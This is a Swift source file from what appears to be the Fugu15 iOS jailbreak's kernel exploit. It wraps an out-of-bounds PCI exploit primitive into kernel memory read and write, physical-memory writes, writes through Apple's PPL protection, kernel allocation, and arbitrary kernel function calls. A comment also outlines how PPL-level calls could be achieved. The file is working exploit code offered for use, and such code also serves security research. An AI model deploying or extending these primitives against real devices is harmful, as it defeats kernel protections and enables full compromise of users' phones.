//
//  KRWHandler.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//  Modified by Lars Fröder.

import Foundation

public enum KRWError: Error {
    case notSupported
    case PPLBypassNotSupported
    
    case readFailed
    case writeFailed
    
    case customError(description: String)
}

public struct KRWOptions: OptionSet {
    public let rawValue: Int
    
    public init(rawValue: Int) {
        self.rawValue = rawValue
    }
    
    public static let virtRW    = Self(rawValue: 1 << 0)
    public static let physRW    = Self(rawValue: 1 << 1)
    public static let kalloc    = Self(rawValue: 1 << 2)
    public static let kcall     = Self(rawValue: 1 << 3)
    public static let PPLBypass = Self(rawValue: 1 << 4)
}

public struct KRWAddress {
    public struct Options: OptionSet {
        public let rawValue: Int
        
        public init(rawValue: Int) {
            self.rawValue = rawValue
        }
        
        public static let physical = Self(rawValue: 1 << 0)
        public static let PPL      = Self(rawValue: 1 << 1)
    }
    
    public init(address: UInt64, options: Options) {
        self.address = address
        self.options = options
    }
    
    public let address: UInt64
    public let options: Options
}

public class KRWHandler {
    func doRequest(id: UInt64, addr: UInt64, size: UInt64, buf: Data?) throws -> (status: UInt64, result: UInt64, data: Data?) {
        let res = Fugu15.oobPCIRequest(id: id, addrPid: addr, size: size, buf: buf)
        
        if Int64(bitPattern: res.status) < 0 {
            if let d = res.data {
                if let s = String(data: d, encoding: .utf8) {
                    throw KRWError.customError(description: s)
                }
            }
            
            throw KRWError.customError(description: "Unknown: \(res.status)")
        }
        
        return res
    }
    
    public func kread(address: KRWAddress, size: UInt) throws -> Data {
        if address.options.contains(.physical) {
            let res = try doRequest(id: 1, addr: address.address, size: UInt64(size), buf: nil)
            
            return res.data ?? Data()
        } else {
            let res = try doRequest(id: 0, addr: address.address, size: UInt64(size), buf: nil)
            
            return res.data ?? Data()
        }
    }
    
    public func kwrite(address: KRWAddress, data: Data) throws {
        var id: UInt64 = address.options.contains(.physical) ? 3 : 2
        if address.options.contains(.PPL) {
            id += 2
        }
        
        _ = try doRequest(id: id, addr: address.address, size: UInt64(data.count), buf: data)
    }
    
    public func kalloc(size: UInt) throws -> UInt64 {
        guard let kallocAddr = Fugu15.patchfinder?.kalloc_data_external else {
            throw KRWError.customError(description: "Failed to find kalloc_data_external!")
        }
        
        for _ in 0..<1024 {
            let res = try kcall(func: KRWAddress(address: kallocAddr + Fugu15.kernelSlide, options: []), a1: UInt64(size), a2: 1, a3: 0, a4: 0, a5: 0, a6: 0, a7: 0, a8: 0)
            if res != 0 {
                return res
            }
        }
        
        throw KRWError.customError(description: "kalloc_data_external failed to allocate!")
    }
    
    public func kfree(address: UInt64) throws {
        throw KRWError.notSupported
    }
    
    public func kcall(func: KRWAddress, a1: UInt64, a2: UInt64, a3: UInt64, a4: UInt64, a5: UInt64, a6: UInt64, a7: UInt64, a8: UInt64) throws -> UInt64 {
        guard !`func`.options.contains(.physical) else {
            // Nope, can't do that without disabling MMU (hardware prevents that)
            throw KRWError.customError(description: "Physical kcall not supported!")
        }
        
        guard !`func`.options.contains(.PPL) else {
            // Support could be added by e.g. making the PPL stack kernel writeable
            // and then triggering an exception in PPL, making sure a fault handler
            // is set that jumps to e.g. x22
            // The kernel will then update the PPL register state on the stack and return to PPL
            // which will then jump to x22
            throw KRWError.customError(description: "PPL kcall not supported!")
        }
        
        var data = Data(fromObject: a1)
        data.appendGeneric(value: a2)
        data.appendGeneric(value: a3)
        data.appendGeneric(value: a4)
        data.appendGeneric(value: a5)
        data.appendGeneric(value: a6)
        data.appendGeneric(value: a7)
        data.appendGeneric(value: a8)
        
        let res = try doRequest(id: 6, addr: `func`.address, size: UInt64(data.count), buf: data)
        
        return res.result
    }
    
    func r64(_ addr: KRWAddress) -> UInt64? {
        do {
            let res = try kread(address: addr, size: UInt(MemoryLayout<UInt64>.size))
            return res.tryGetGeneric(type: UInt64.self)
        } catch {
            return nil
        }
    }
        
    func rPtr(_ addr: KRWAddress) -> UInt64? {
        guard let ptr = r64(addr) else {
            return nil
        }
        
        if ((ptr >> 55) & 1) != 0 {
            return ptr | 0xFFFFFF8000000000
        }
        
        return ptr
    }
    
    func r32(_ addr: KRWAddress) -> UInt32? {
        do {
            let res = try kread(address: addr, size: UInt(MemoryLayout<UInt32>.size))
            return res.tryGetGeneric(type: UInt32.self)
        } catch {
            return nil
        }
    }
    
    func r16(_ addr: KRWAddress) -> UInt16? {
        do {
            let res = try kread(address: addr, size: UInt(MemoryLayout<UInt16>.size))
            return res.tryGetGeneric(type: UInt16.self)
        } catch {
            return nil
        }
    }
    
    func r8(_ addr: KRWAddress) -> UInt8? {
        do {
            let res = try kread(address: addr, size: UInt(MemoryLayout<UInt8>.size))
            return res.tryGetGeneric(type: UInt8.self)
        } catch {
            return nil
        }
    }
    
    func w64(_ addr: KRWAddress, value: UInt64) -> Bool {
        let data = Data(fromObject: value)
        
        do {
            try kwrite(address: addr, data: data)
            return true
        } catch {
            return false
        }
    }
    
    func w32(_ addr: KRWAddress, value: UInt32) -> Bool {
        let data = Data(fromObject: value)
        
        do {
            try kwrite(address: addr, data: data)
            return true
        } catch {
            return false
        }
    }
    
    func w16(_ addr: KRWAddress, value: UInt16) -> Bool {
        let data = Data(fromObject: value)
        
        do {
            try kwrite(address: addr, data: data)
            return true
        } catch {
            return false
        }
    }
    
    func w8(_ addr: KRWAddress, value: UInt8) -> Bool {
        let data = Data(fromObject: value)
        
        do {
            try kwrite(address: addr, data: data)
            return true
        } catch {
            return false
        }
    }
}
